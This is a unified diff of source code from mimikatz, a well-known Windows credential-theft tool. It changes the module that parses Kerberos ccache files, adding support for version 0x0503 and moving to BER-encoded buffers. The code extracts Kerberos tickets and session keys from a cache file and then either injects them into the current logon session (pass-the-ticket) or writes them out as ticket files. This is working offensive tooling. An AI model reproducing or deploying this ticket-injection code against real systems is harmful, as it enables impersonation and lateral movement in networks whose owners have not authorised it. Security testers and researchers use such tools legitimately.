@@ -1,11 +1,11 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_kerberos_ccache.h"
 
-const UNICODE_STRING usXCACHECONF = {24, 26, L"X-CACHECONF:"};
+DECLARE_CONST_UNICODE_STRING(usXCACHECONF, L"X-CACHECONF:");
 NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave)
 {
 	PBYTE file, data;
@@ -14,8 +14,7 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 
 	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
 	PKIWI_KERBEROS_TICKET ticket;
-	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
-	DWORD App_KrbCred_Size;
+	PBERVAL BerApp_KrbCred;
 	wchar_t * saveFilename;
 
 	if(argc)
@@ -24,9 +23,10 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 		{
 			data = file;	
 			version = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
-			if(version == 0x0504)
+			if((version == 0x0504) || (version == 0x0503))
 			{
-				data += sizeof(USHORT) + _byteswap_ushort(*(PUSHORT) data);
+				if(version == 0x0504)
+					data += sizeof(USHORT) + _byteswap_ushort(*(PUSHORT) data);
 				kuhl_m_kerberos_ccache_externalname(&data, &principalName, &principalRealm);
 				if(principalName)
 				{
@@ -38,18 +38,25 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 						{
 							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ClientName, &ticket->AltTargetDomainName);
 							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ServiceName, &ticket->DomainName);
-
+							
 							ticket->TargetName = kuhl_m_kerberos_ticket_copyExternalName(ticket->ServiceName);
 							kull_m_string_copyUnicodeStringBuffer(&ticket->DomainName, &ticket->TargetDomainName);
-
+							
 							ticket->KeyType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
 							ticket->TicketEncType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
-							ticket->Key.Length = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
+							if(version == 0x0504)
+							{
+								ticket->Key.Length = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
+							}
+							else
+							{
+								ticket->Key.Length = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
+							}
 							if(ticket->Key.Length)
 								if(ticket->Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Key.Length))
 									RtlCopyMemory(ticket->Key.Value, data, ticket->Key.Length);
 							data += ticket->Key.Length + sizeof(DWORD); // authtime;
-
+							
 							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->StartTime); data += sizeof(DWORD); // local ?
 							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->EndTime); data += sizeof(DWORD);
 							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->RenewUntil); data += sizeof(DWORD) + sizeof(UCHAR); // skey
@@ -68,30 +75,29 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 
 							if(!RtlEqualUnicodeString(&usXCACHECONF, &ticket->TargetDomainName, TRUE))
 							{
-								kuhl_m_kerberos_ticket_display(ticket, FALSE);
+								kuhl_m_kerberos_ticket_display(ticket, TRUE, FALSE);
 								if(isSave || isInject)
 								{
-									if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
+									if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
 									{
-										App_KrbCred_Size = kull_m_asn1_getSize(App_KrbCred);
 										if(isInject)
 										{
 											kprintf(L"\n\t   * Injecting ticket : ");
-											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCred_Size)))
+											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
 												kprintf(L"OK\n");
 										}
 										else
 										{
 											if(saveFilename = kuhl_m_kerberos_ccache_generateFileName(i, ticket, MIMIKATZ_KERBEROS_EXT))
 											{
-												if(kull_m_file_writeData(saveFilename, (PBYTE) App_KrbCred, App_KrbCred_Size))
+												if(kull_m_file_writeData(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 													kprintf(L"\n\t   * Saved to file %s !", saveFilename);
 												else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 
 												LocalFree(saveFilename);
 											}
 										}
-										LocalFree(App_KrbCred);
+										ber_bvfree(BerApp_KrbCred);
 									}
 								}
 							}
@@ -102,7 +108,7 @@ NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, 
 					kuhl_m_kerberos_ticket_freeExternalName(principalName);
 				}
 			}
-			else PRINT_ERROR(L"ccache version != 0x0504\n");
+			else PRINT_ERROR(L"ccache version != 0x0504 or version != 0x0503\n");
 			LocalFree(file);
 		}
 		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
@@ -125,11 +131,7 @@ NTSTATUS kuhl_m_kerberos_ccache_list(int argc, wchar_t * argv[])
 
 void kuhl_m_kerberos_ccache_UnixTimeToFileTime(time_t t, LPFILETIME pft)
 {
-	LONGLONG ll;
-
-	ll = Int32x32To64(t, 10000000) + 116444736000000000;
-	pft->dwLowDateTime = (DWORD)ll;
-	pft->dwHighDateTime = ll >> 32;
+	*(PLONGLONG) pft = Int32x32To64(t, 10000000) + 116444736000000000;
 }
 
 BOOL kuhl_m_kerberos_ccache_unicode_string(PBYTE *data, PUNICODE_STRING ustring)
